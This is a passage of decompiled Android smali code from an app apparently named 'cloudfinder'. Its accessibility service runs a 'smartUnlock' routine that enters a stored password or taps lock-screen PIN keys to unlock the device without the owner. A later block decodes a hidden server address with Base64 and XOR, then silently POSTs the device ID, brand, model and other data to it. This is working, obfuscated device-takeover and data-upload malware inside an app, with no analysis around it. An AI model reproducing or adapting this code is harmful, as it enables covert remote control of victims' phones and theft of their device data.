    const-wide/16 v4, 0x1f4

    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    invoke-virtual {v8}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_23

    invoke-static {v0}, Lڜٟٱڀ/أ;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_22

    new-instance v2, Landroid/os/Bundle;

    invoke-direct {v2}, Landroid/os/Bundle;-><init>()V

    const-string v4, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    invoke-virtual {v2, v4, v3}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    const/high16 v3, 0x200000

    invoke-virtual {v0, v3, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    const-string v0, "smartUnlock: password set via ACTION_SET_TEXT"

    goto :goto_15

    :cond_22
    invoke-virtual {v8, v3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؿ(Ljava/lang/String;)V

    const-string v0, "smartUnlock: password fallback inputText"

    :goto_15
    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_23
    const-wide/16 v2, 0x12c

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    invoke-virtual {v8}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2f

    const/4 v2, 0x0

    invoke-static {v0, v12, v2}, Lڜٟٱڀ/أ;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_24

    const/16 v2, 0x10

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const-string v0, "smartUnlock: clicked enter key"

    goto/16 :goto_1b

    :cond_24
    const-string v0, "\n"

    invoke-virtual {v8, v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؿ(Ljava/lang/String;)V

    const-string v0, "smartUnlock: enter via inputText"

    goto/16 :goto_1b

    :cond_25
    invoke-virtual {v3, v13}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_26

    invoke-virtual {v3, v13}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    goto :goto_16

    :cond_26
    invoke-virtual {v3, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    :goto_16
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    array-length v3, v0

    const/4 v5, 0x0

    :goto_17
    if-ge v5, v3, :cond_28

    aget-object v6, v0, v5

    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_27

    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_27
    add-int/lit8 v5, v5, 0x1

    goto :goto_17

    :cond_28
    invoke-virtual {v2, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "smartUnlock: PIN keys="

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    move-result v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_18
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_2e

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_29

    move-object v3, v12

    goto :goto_19

    :cond_29
    const-string v3, "OK"

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2a

    const-string v3, "com.android.systemui:id/key_enter_text"

    goto :goto_19

    :cond_2a
    const-string v3, "Delete"

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2b

    const-string v3, "com.android.systemui:id/delete_button"

    goto :goto_19

    :cond_2b
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "com.android.systemui:id/key"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    :goto_19
    invoke-virtual {v8}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    const/4 v6, 0x0

    if-eqz v5, :cond_2d

    invoke-static {v5, v3, v6}, Lڜٟٱڀ/أ;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_b

    const-string v6, " ("

    if-eqz v5, :cond_2c

    const/16 v9, 0x10

    :try_start_11
    invoke-virtual {v5, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "smartUnlock: clicked "

    invoke-virtual {v5, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v7, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1a

    :cond_2c
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "smartUnlock: key not found: "

    invoke-virtual {v5, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v7, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_2d
    :goto_1a
    const-wide/16 v2, 0x12c

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    goto/16 :goto_18

    :cond_2e
    const-string v0, "smartUnlock: PIN entered"

    :goto_1b
    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_b

    goto :goto_1c

    :catch_b
    move-exception v0

    const-string v2, "smartUnlock error"

    invoke-static {v7, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2f
    :goto_1c
    return-void

    :pswitch_3
    iget-object v0, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    iget-object v2, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_12
    invoke-virtual {v0, v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋(Ljava/lang/String;)V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_c

    :catch_c
    return-void

    :pswitch_4
    iget-object v0, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/google/firebase/messaging/EnhancedIntentService;

    iget-object v2, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroid/content/Intent;

    iget-object v3, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v3, Lؾپۑ۟ڂڷ/ا;

    sget v4, Lcom/google/firebase/messaging/EnhancedIntentService;->ؤ:I

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_13
    invoke-virtual {v0, v2}, Lcom/google/firebase/messaging/EnhancedIntentService;->ء(Landroid/content/Intent;)V
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_0

    const/4 v0, 0x0

    invoke-virtual {v3, v0}, Lؾپۑ۟ڂڷ/ا;->؋(Ljava/lang/Object;)V

    return-void

    :catchall_0
    move-exception v0

    move-object v2, v0

    const/4 v0, 0x0

    invoke-virtual {v3, v0}, Lؾپۑ۟ڂڷ/ا;->؋(Ljava/lang/Object;)V

    throw v2

    :pswitch_5
    iget-object v0, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/work/impl/utils/futures/SettableFuture;

    iget-object v2, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroidx/work/impl/WorkManagerImpl;

    iget-object v3, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v3, Landroidx/work/WorkRequest;

    invoke-static {v0, v2, v3}, Landroidx/work/impl/WorkerUpdater;->ؠ(Landroidx/work/impl/utils/futures/SettableFuture;Landroidx/work/impl/WorkManagerImpl;Landroidx/work/WorkRequest;)V

    return-void

    :pswitch_6
    iget-object v0, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/work/impl/Processor;

    iget-object v2, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v2, Lڃاـڂڅږ/؋;

    iget-object v3, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v3, Landroidx/work/impl/WorkerWrapper;

    invoke-static {v0, v2, v3}, Landroidx/work/impl/Processor;->ء(Landroidx/work/impl/Processor;Lڃاـڂڅږ/؋;Landroidx/work/impl/WorkerWrapper;)V

    return-void

    :pswitch_7
    iget-object v0, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/room/QueryInterceptorDatabase;

    iget-object v2, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    iget-object v3, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v3, Ljava/util/List;

    invoke-static {v0, v2, v3}, Landroidx/room/QueryInterceptorDatabase;->ؿ(Landroidx/room/QueryInterceptorDatabase;Ljava/lang/String;Ljava/util/List;)V

    return-void

    :pswitch_8
    iget-object v0, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/room/QueryInterceptorDatabase;

    iget-object v2, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    iget-object v3, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v3, [Ljava/lang/Object;

    invoke-static {v0, v2, v3}, Landroidx/room/QueryInterceptorDatabase;->ؾ(Landroidx/room/QueryInterceptorDatabase;Ljava/lang/String;[Ljava/lang/Object;)V

    return-void

    :goto_1d
    iget-object v7, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v7, Ljava/lang/String;

    iget-object v10, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v10, Landroid/content/Context;

    iget-object v11, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v11, Lorg/json/JSONObject;

    const-string v12, "TkR"

    const-string v13, "UTF-8"

    :try_start_14
    const-string v14, "Mi4uKmB1dWtsbXRrb2p0a2pqdGtqYmBjamNqdS4oOzkxPyh1KD8qNSgu"

    const/4 v15, 0x2

    invoke-static {v14, v15}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v14

    array-length v15, v14

    new-array v15, v15, [B

    :goto_1e
    array-length v1, v14

    if-ge v0, v1, :cond_30

    aget-byte v1, v14, v0

    xor-int/lit8 v1, v1, 0x5a

    int-to-byte v1, v1

    aput-byte v1, v15, v0

    add-int/lit8 v0, v0, 0x1

    goto :goto_1e

    :cond_30
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v15, v13}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_d

    goto :goto_1f

    :catch_d
    move-object v0, v9

    :goto_1f
    :try_start_15
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_31

    goto/16 :goto_22

    :cond_31
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v1, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v6, "buildId"

    const-string v14, "a0dcf711"

    invoke-virtual {v1, v6, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    invoke-virtual {v1, v5, v14, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    sget-object v5, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v1, v3, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v1, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_11

    :try_start_16
    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v2

    if-eqz v2, :cond_32

    iget-object v9, v2, Lڜٟٱڀ/د;->إ:Ljava/lang/String;
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_e

    :catch_e
    :cond_32
    if-eqz v9, :cond_33

    :try_start_17
    invoke-virtual {v9}, Ljava/lang/String;->isEmpty()Z

    move-result v2
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_11

    if-eqz v2, :cond_34

    :cond_33
    :try_start_18
    invoke-virtual {v10}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "android_id"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_f

    :catch_f
    :cond_34
    if-eqz v9, :cond_35

    goto :goto_20

    :cond_35
    :try_start_19
    const-string v9, "unknown"

    :goto_20
    invoke-virtual {v1, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_11

    :try_start_1a
    const-string v2, "packageName"

    invoke-virtual {v10}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_10

    :catch_10
    if-eqz v11, :cond_36

    :try_start_1b
    invoke-virtual {v11}, Lorg/json/JSONObject;->keys()Ljava/util/Iterator;

    move-result-object v2

    :goto_21
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_36

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    invoke-virtual {v11, v3}, Lorg/json/JSONObject;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_21

    :cond_36
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    const-string v2, "POST"

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const-string v2, "Content-Type"

    const-string v3, "application/json"

    invoke-virtual {v0, v2, v3}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/net/URLConnection;->setDoOutput(Z)V

    const/16 v2, 0x1f40

    invoke-virtual {v0, v2}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    invoke-virtual {v0, v2}, Ljava/net/URLConnection;->setReadTimeout(I)V

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v13}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0}, Ljava/net/URLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " -> "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v12, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_11

    goto :goto_22

    :catch_11
    move-exception v0

    const-string v1, " err: "

    invoke-static {v7, v1}, Landroidx/activity/result/؋;->ت(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v12, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_22
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
